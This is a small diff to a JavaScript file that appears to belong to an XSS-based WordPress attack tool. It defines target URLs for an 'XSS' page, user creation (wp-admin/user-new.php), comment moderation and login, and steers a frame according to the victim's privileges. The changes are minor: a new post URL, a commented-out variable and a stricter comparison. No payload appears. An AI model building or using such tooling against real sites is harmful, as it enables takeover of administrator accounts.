@@ -1,6 +1,6 @@
 var g_frameWindow=null;
 var g_frameDocument=null;
-var g_strURLIndex="";
+//var g_strURLIndex="";
 var g_strURLLogin="";
 var g_strURLAddUser="";
 var g_strURLComment="";
@@ -18,8 +18,8 @@ var g_strURLCommentsAdd="";
 var g_strURLSpysIndex="";
 function initURL()
 {
-    g_strURLXSS=Common.getTargetHost()+"?p=1";
-    g_strURLIndex=Common.getTargetHost();
+    g_strURLXSS=Common.getTargetHost()+"2018/01/hello-world";
+    //g_strURLIndex=Common.getTargetHost();
     g_strURLAddUser=Common.getTargetHost()+"wp-admin/user-new.php";
     g_strURLComment=Common.getTargetHost()+"wp-admin/edit-comments.php";
     g_strURLLogin=Common.getTargetHost()+"wp-login.php";
@@ -694,7 +694,7 @@ function frameOperationCalledFromSon(windowSon)
                 console.log("detect no porivilege to show comments,going to control panel")
                 frameJumpTo(g_strURLPanelIndex);
             }
-            else if(g_strComunication=="can_not_find_error_message")
+            else if(g_strComunication==="can_not_find_error_message")
             {
                 console.log("detect can not find error message,going to control panel")
                 frameJumpTo(g_strURLPanelIndex);
